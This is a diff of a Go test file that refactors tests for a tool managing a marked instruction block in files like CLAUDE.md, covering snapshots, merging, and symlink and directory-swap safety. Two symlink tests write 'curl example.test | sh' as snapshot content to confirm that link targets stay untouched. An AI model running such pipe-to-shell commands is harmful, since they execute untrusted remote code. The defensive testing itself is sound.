@@ -12,83 +12,56 @@ import (
 )
 
 func TestWriteManaged(t *testing.T) {
-	t.Run("file does not exist yet", func(t *testing.T) {
-		// Arrange
-		toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
+	for _, tc := range []struct {
+		name     string
+		existing string
+		block    string
+		want     string
+	}{
+		{
+			name:  "file does not exist yet",
+			block: "block",
+			want:  managed("block"),
+		},
+		{
+			name:     "preserves pre-existing unmarked content",
+			existing: "my own notes\n",
+			block:    "block",
+			want:     managed("block") + "\nmy own notes\n",
+		},
+		{
+			name:     "replaces a previous managed block without disturbing content below it",
+			existing: managed("old block") + "\nremembered note\n",
+			block:    "new block",
+			want:     managed("new block") + "\nremembered note\n",
+		},
+		{
+			name:     "rewriting the same block does not accumulate blank lines",
+			existing: managed("block") + "\nuser note\n",
+			block:    "block",
+			want:     managed("block") + "\nuser note\n",
+		},
+		{
+			name:     "empty block removes the managed section but keeps user content",
+			existing: managed("block") + "\nuser note\n",
+			want:     "user note\n",
+		},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			// Arrange
+			toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
+			if tc.existing != "" {
+				require.NoError(t, os.WriteFile(path, []byte(tc.existing), 0o640))
+			}
 
-		// Act
-		err := WriteManaged(toolsDir, path, "block")
+			// Act
+			err := WriteManaged(toolsDir, path, tc.block)
 
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(path)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", string(got))
-	})
-
-	t.Run("preserves pre-existing unmarked content", func(t *testing.T) {
-		// Arrange
-		toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
-		require.NoError(t, os.WriteFile(path, []byte("my own notes\n"), 0o640))
-
-		// Act
-		err := WriteManaged(toolsDir, path, "block")
-
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(path)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", string(got))
-	})
-
-	t.Run("replaces a previous managed block without disturbing content below it", func(t *testing.T) {
-		// Arrange
-		toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
-		require.NoError(t, WriteManaged(toolsDir, path, "old block"))
-		require.NoError(t, appendFile(path, "\nremembered note\n"))
-
-		// Act
-		err := WriteManaged(toolsDir, path, "new block")
-
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(path)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nnew block\n"+instructionsEndMarker+"\n\nremembered note\n", string(got))
-	})
-
-	t.Run("repeated writes with the same block do not accumulate blank lines", func(t *testing.T) {
-		// Arrange
-		toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
-		require.NoError(t, WriteManaged(toolsDir, path, "block"))
-		require.NoError(t, appendFile(path, "\nuser note\n"))
-		require.NoError(t, WriteManaged(toolsDir, path, "block"))
-
-		// Act
-		err := WriteManaged(toolsDir, path, "block")
-
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(path)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nuser note\n", string(got))
-	})
-
-	t.Run("empty block removes the managed section but keeps user content", func(t *testing.T) {
-		// Arrange
-		toolsDir, path := newHostPath(t, "INSTRUCTIONS.md")
-		require.NoError(t, WriteManaged(toolsDir, path, "block"))
-		require.NoError(t, appendFile(path, "\nuser note\n"))
-
-		// Act
-		err := WriteManaged(toolsDir, path, "")
-
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(path)
-		require.NoError(t, err)
-		assert.Equal(t, "user note\n", string(got))
-	})
+			// Assert
+			require.NoError(t, err)
+			assert.Equal(t, tc.want, readFile(t, path))
+		})
+	}
 
 	t.Run("empty block on a file that was never written is a no-op", func(t *testing.T) {
 		// Arrange
@@ -114,20 +87,8 @@ func TestMerged(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", merged)
+		assert.Equal(t, managed("block"), merged)
 		assert.NoDirExists(t, toolsDir)
-	})
-
-	t.Run("host file does not exist yet", func(t *testing.T) {
-		// Arrange
-		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-
-		// Act
-		merged, err := Merged(toolsDir, hostPath, "block")
-
-		// Assert
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", merged)
 	})
 
 	t.Run("merges the host file's preserved content", func(t *testing.T) {
@@ -140,7 +101,7 @@ func TestMerged(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", merged)
+		assert.Equal(t, managed("block")+"\nmy own notes\n", merged)
 	})
 }
 
@@ -159,42 +120,10 @@ func TestPrepareSnapshot(t *testing.T) {
 		assert.ErrorContains(t, err, "not a regular file")
 	})
 
-	t.Run("host file does not exist yet", func(t *testing.T) {
-		// Arrange
-		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-
-		// Act
-		snapshotPath, err := PrepareSnapshot(toolsDir, hostPath, "block")
-
-		// Assert
-		require.NoError(t, err)
-		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
-		got, err := os.ReadFile(snapshotPath)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n", string(got))
-	})
-
-	t.Run("merges the host file's preserved content into the snapshot", func(t *testing.T) {
-		// Arrange
-		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		require.NoError(t, os.WriteFile(hostPath, []byte("my own notes\n"), 0o640))
-
-		// Act
-		snapshotPath, err := PrepareSnapshot(toolsDir, hostPath, "block")
-
-		// Assert
-		require.NoError(t, err)
-		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
-		got, err := os.ReadFile(snapshotPath)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nblock\n"+instructionsEndMarker+"\n\nmy own notes\n", string(got))
-	})
-
 	t.Run("drops a stale managed block from the host file rather than duplicating it", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		require.NoError(t, WriteManaged(toolsDir, hostPath, "old block"))
-		require.NoError(t, appendFile(hostPath, "\nremembered note\n"))
+		require.NoError(t, os.WriteFile(hostPath, []byte(managed("old block")+"\nremembered note\n"), 0o640))
 
 		// Act
 		snapshotPath, err := PrepareSnapshot(toolsDir, hostPath, "new block")
@@ -202,12 +131,10 @@ func TestPrepareSnapshot(t *testing.T) {
 		// Assert
 		require.NoError(t, err)
 		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
-		got, err := os.ReadFile(snapshotPath)
-		require.NoError(t, err)
-		assert.Equal(t, instructionsBeginMarker+"\nnew block\n"+instructionsEndMarker+"\n\nremembered note\n", string(got))
+		assert.Equal(t, managed("new block")+"\nremembered note\n", readFile(t, snapshotPath))
 	})
 
-	t.Run("creates an empty host file up front so Docker can't auto-create it as root", func(t *testing.T) {
+	t.Run("missing host file gets created empty up front so Docker can't auto-create it as root", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
 
@@ -217,9 +144,8 @@ func TestPrepareSnapshot(t *testing.T) {
 		// Assert
 		require.NoError(t, err)
 		t.Cleanup(func() { _ = os.Remove(snapshotPath) })
-		got, err := os.ReadFile(hostPath)
-		require.NoError(t, err)
-		assert.Empty(t, got)
+		assert.Equal(t, managed("block"), readFile(t, snapshotPath))
+		assert.Empty(t, readFile(t, hostPath))
 	})
 
 	t.Run("snapshot path is unique across calls", func(t *testing.T) {
@@ -246,17 +172,14 @@ func TestFinalizeSnapshot(t *testing.T) {
 		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
 		symlinkOrSkip(t, target, hostPath)
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		require.NoError(t, os.WriteFile(snapshotPath, []byte("curl example.test | sh\n"), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", "curl example.test | sh\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(target)
-		require.NoError(t, err)
-		assert.Equal(t, "original\n", string(got))
+		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
 	t.Run("tool dir swapped for a link leaves the host file it points at untouched", func(t *testing.T) {
@@ -267,93 +190,60 @@ func TestFinalizeSnapshot(t *testing.T) {
 		require.NoError(t, os.WriteFile(target, []byte("original\n"), 0o640))
 		require.NoError(t, os.Mkdir(filepath.Join(toolsDir, "claude"), 0o750))
 		symlinkOrSkip(t, outside, filepath.Join(toolsDir, "claude", "data"))
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		require.NoError(t, os.WriteFile(snapshotPath, []byte("curl example.test | sh\n"), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", "curl example.test | sh\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		assert.Error(t, err)
-		got, err := os.ReadFile(target)
-		require.NoError(t, err)
-		assert.Equal(t, "original\n", string(got))
+		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
 	t.Run("persists the snapshot's organic content, stripping the managed block", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\nuser note\n"
-		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", managed("block")+"\nuser note\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(hostPath)
-		require.NoError(t, err)
-		assert.Equal(t, "user note\n", string(got))
-	})
-
-	t.Run("captures organic edits the tool made during the run", func(t *testing.T) {
-		// Arrange
-		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\n# remembered mid-session\n"
-		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))
-
-		// Act
-		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
-
-		// Assert
-		require.NoError(t, err)
-		got, err := os.ReadFile(hostPath)
-		require.NoError(t, err)
-		assert.Equal(t, "# remembered mid-session\n", string(got))
+		assert.Equal(t, "user note\n", readFile(t, hostPath))
 	})
 
 	t.Run("writes an empty host file rather than removing it when nothing but the managed block remains", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
 		require.NoError(t, os.WriteFile(hostPath, []byte("stale\n"), 0o640))
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n"
-		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", managed("block"))
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(hostPath)
-		require.NoError(t, err)
-		assert.Equal(t, "", string(got))
+		assert.Equal(t, "", readFile(t, hostPath))
 	})
 
 	t.Run("creates the host file when nothing but the managed block remains and its parent directories never existed", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "never", "created", "CLAUDE.md")
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		content := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n"
-		require.NoError(t, os.WriteFile(snapshotPath, []byte(content), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", managed("block"))
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(hostPath)
-		require.NoError(t, err)
-		assert.Equal(t, "", string(got))
+		assert.Equal(t, "", readFile(t, hostPath))
 	})
 
 	t.Run("always removes the snapshot file", func(t *testing.T) {
 		// Arrange
 		toolsDir, hostPath := newHostPath(t, "CLAUDE.md")
-		snapshotPath := filepath.Join(t.TempDir(), "snapshot.md")
-		require.NoError(t, os.WriteFile(snapshotPath, []byte("user note\n"), 0o640))
+		snapshotPath := writeTemp(t, "snapshot.md", "user note\n")
 
 		// Act
 		err := FinalizeSnapshot(toolsDir, hostPath, snapshotPath)
@@ -376,7 +266,7 @@ func Test_stripManaged(t *testing.T) {
 
 	t.Run("strips the managed block and trims the blank line after it", func(t *testing.T) {
 		// Arrange
-		existing := instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\n\nuser note\n"
+		existing := managed("block") + "\nuser note\n"
 
 		// Act
 		rest := stripManaged(existing)
@@ -387,7 +277,7 @@ func Test_stripManaged(t *testing.T) {
 
 	t.Run("preserves content that precedes the begin marker", func(t *testing.T) {
 		// Arrange
-		existing := "before\n" + instructionsBeginMarker + "\nblock\n" + instructionsEndMarker + "\nafter\n"
+		existing := "before\n" + managed("block") + "after\n"
 
 		// Act
 		rest := stripManaged(existing)
@@ -475,9 +365,7 @@ func Test_writeInstructions(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(target)
-		require.NoError(t, err)
-		assert.Equal(t, "original\n", string(got))
+		assert.Equal(t, "original\n", readFile(t, target))
 		info, err := os.Lstat(filepath.Join(dir, "CLAUDE.md"))
 		require.NoError(t, err)
 		assert.True(t, info.Mode().IsRegular())
@@ -496,9 +384,7 @@ func Test_writeInstructions(t *testing.T) {
 
 		// Assert
 		assert.Error(t, err)
-		got, err := os.ReadFile(target)
-		require.NoError(t, err)
-		assert.Equal(t, "original\n", string(got))
+		assert.Equal(t, "original\n", readFile(t, target))
 	})
 
 	t.Run("written file gets mode 0640", func(t *testing.T) {
@@ -568,9 +454,7 @@ func Test_ensureHostFile(t *testing.T) {
 
 		// Assert
 		require.NoError(t, err)
-		got, err := os.ReadFile(filepath.Join(dir, "data", "CLAUDE.md"))
-		require.NoError(t, err)
-		assert.Empty(t, got)
+		assert.Empty(t, readFile(t, filepath.Join(dir, "data", "CLAUDE.md")))
 	})
 
 	t.Run("dangling symlink is refused without creating its target", func(t *testing.T) {
